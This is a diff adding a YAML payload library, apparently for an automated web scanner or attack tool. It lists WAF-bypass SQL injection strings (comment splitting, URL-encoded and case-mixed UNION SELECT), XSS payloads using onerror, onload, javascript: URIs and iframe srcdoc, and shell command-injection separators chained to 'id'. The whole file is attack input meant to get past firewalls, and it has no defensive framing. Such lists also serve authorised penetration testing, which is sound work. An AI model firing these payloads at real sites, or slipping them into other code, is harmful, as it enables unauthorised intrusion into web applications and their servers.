@@ -1,0 +1,31 @@
+# F4.2 — 注入 WAF 原语库
+# 用于 LOOP 矩阵 sqli_possible / xss_possible 的 WAF 绕过步骤
+
+sql_injection_primitives:
+  - "UNION/**/SELECT"
+  - "/*!UNION*/SELECT"
+  - "UNI%4fN SEL%45CT"
+  - "/*!50000UNION*/SELECT"
+  - "%23%0aUNION"
+  - "/*%0a*/UNION/*%0a*/SELECT"
+  - "UNION%20ALL%20SELECT"
+  - "uNiOn%0AaLl%0AsElEcT"
+  - "/*!%55nion*/%20/*!%53elect*/"
+  - "concat(0x union 0x select)"
+
+xss_primitives:
+  - "<img/src=x onerror=alert(1)>"
+  - "<svg/onload=alert(1)>"
+  - "javascript&#58;alert(1)"
+  - "<script>alert(1)</script>"
+  - "<iframe srcdoc='<script>alert(1)</script>'>"
+
+command_injection_primitives:
+  - ";id"
+  - "|id"
+  - "||id"
+  - "&&id"
+  - "`id`"
+  - "$(id)"
+  - "%0aid"
+  - "\nid"
